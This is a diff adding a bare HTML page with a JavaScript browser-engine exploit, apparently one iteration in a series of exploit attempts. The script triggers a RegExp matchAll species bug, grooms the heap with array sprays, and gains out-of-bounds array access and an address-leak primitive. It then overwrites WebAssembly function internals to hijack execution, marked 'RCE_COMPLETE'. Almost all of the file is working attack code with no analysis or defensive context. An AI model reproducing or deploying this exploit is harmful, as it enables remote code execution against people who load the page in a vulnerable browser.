@@ -1,0 +1,129 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P93</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function flo(f){f64[0]=f;return u32[0];}
+function fhi(f){f64[0]=f;return u32[1];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
+const PINS=[0x1080011];
+const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
+const marker={mmm:1};
+const marker2={zzz:2};
+const objB=new Array(0x8000);
+for(var i=0;i<objB.length;i++)objB[i]=marker;
+// Single-export module A: f()=42 — IDENTICAL to p46
+const wasmA=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+objB[4]=wasmA;
+const victim=[1.22,1.33,1.44];
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+const sk=[];
+log("UA: "+navigator.userAgent);
+// NO pre-trigger f() call — keep heap identical to p46
+trash(230);trash(230);
+objB[4]=wasmA; objB[5]=marker;
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+for(let r=0;r<3;r++){
+  const pin=PINS[r%2];
+  const c1=w2f(pin,MAXS);
+  for(let i=0;i<12;i++){
+    const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);
+    for(let j=1;j<a.length;j+=2)a[j]=c1;
+    sk.push(a);
+  }
+}
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+if(Array.isArray(m)){
+  log("L: "+m.length);
+  // OB scan — identical to p46
+  const cands=[];
+  for(let k=0x8000;k<0x10010;k++){
+    try{const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+      if(lo===hi&&(lo&1n)===1n&&lo>0x100000n){if(f2i(m[k+1])===v){const v3=f2i(m[k+2]);const w=v3&0xffffffffn;if(w!==lo&&(w&1n)===1n&&w>0x100n){cands.push(k);}}}}catch(e){break;}
+    if(cands.length>=6)break;
+  }
+  log("C:"+cands.length);
+  let OB=-1;
+  for(const k of cands){const b=f2i(m[k+2]);objB[4]=marker2;const a=f2i(m[k+2]);objB[4]=marker;if(a!==b){OB=k;break;}}
+  if(OB>=0){
+    log("OB:"+OB.toString(16));
+    // ===== RCE CODE STARTS HERE (only runs on A=true) =====
+    // Create module B AFTER trigger (no heap impact on trigger)
+    const wasmB=new WebAssembly.Instance(new WebAssembly.Module(
+      new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,103,0,0,10,7,1,5,0,65,185,10,11])));
+    // Get function refs
+    const fFunc=wasmA.exports.f;
+    const gFunc=wasmB.exports.g;
+    log("PRE:f="+fFunc()+" g="+gFunc());
+    // addrof both
+    objB[4]=fFunc;const fA=Number(f2i(m[OB+2])&0xffffffffn);objB[4]=marker;
+    objB[4]=gFunc;const gA=Number(f2i(m[OB+2])&0xffffffffn);objB[4]=marker;
+    log("fA:"+fA.toString(16)+" gA:"+gA.toString(16));
+    const BASE=0x1080018;
+    const fR=fA&0xFFFFFFFE,gR=gA&0xFFFFFFFE;
+    log("fM:"+(fR%8)+" gM:"+(gR%8));
+    const fOff=fR-BASE,gOff=gR-BASE;
+    log("fO:"+fOff.toString(16)+" gO:"+gOff.toString(16));
+    if(fOff>=0&&gOff>=0){
+      // Dump diffs
+      let dd="";
+      for(let q=0;q<8;q++){
+        const fi=Math.floor((fOff+q*8)/8);
+        const gi=Math.floor((gOff+q*8)/8);
+        try{
+          const fl=flo(m[fi]),fh=fhi(m[fi]);
+          const gl=flo(m[gi]),gh=fhi(m[gi]);
+          if(fl!==gl)dd+="Q"+q+"L:"+fl.toString(16)+"/"+gl.toString(16)+" ";
+          if(fh!==gh)dd+="Q"+q+"H:"+fh.toString(16)+"/"+gh.toString(16)+" ";
+        }catch(e){dd+="Q"+q+":E ";}
+      }
+      log("D:"+dd);
+      // Try swapping each diff (Q3 first = likely code field)
+      let rce=false;
+      const order=[3,4,5,2,6,1,7,0];
+      for(const q of order){
+        if(rce)break;
+        const fi=Math.floor((fOff+q*8)/8);
+        const gi=Math.floor((gOff+q*8)/8);
+        try{
+          const fl=flo(m[fi]),fh_=fhi(m[fi]);
+          const gl=flo(m[gi]),gh=fhi(m[gi]);
+          // Save originals using flo/fhi to avoid NaN issues
+          const ofl=fl,ofh=fh_;
+          if(fl!==gl){
+            m[fi]=w2f(gl,fh_);
+            try{const r=fFunc();log("Q"+q+"L:"+r);if(r===1337){log("RCE_COMPLETE");rce=true;}}
+            catch(e){log("Q"+q+"L:E");}
+            if(!rce)m[fi]=w2f(ofl,ofh);
+          }
+          if(!rce&&fh_!==gh){
+            m[fi]=w2f(fl,gh);
+            try{const r=fFunc();log("Q"+q+"H:"+r);if(r===1337){log("RCE_COMPLETE");rce=true;}}
+            catch(e){log("Q"+q+"H:E");}
+            if(!rce)m[fi]=w2f(ofl,ofh);
+          }
+        }catch(e){}
+      }
+      if(!rce)log("P1_MISS");
+    }else{log("BELOW:"+fOff.toString(16)+" "+gOff.toString(16));}
+  }else{log("STALE");}
+  log("W: "+wasmA.exports.f());
+}else{log("NA");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
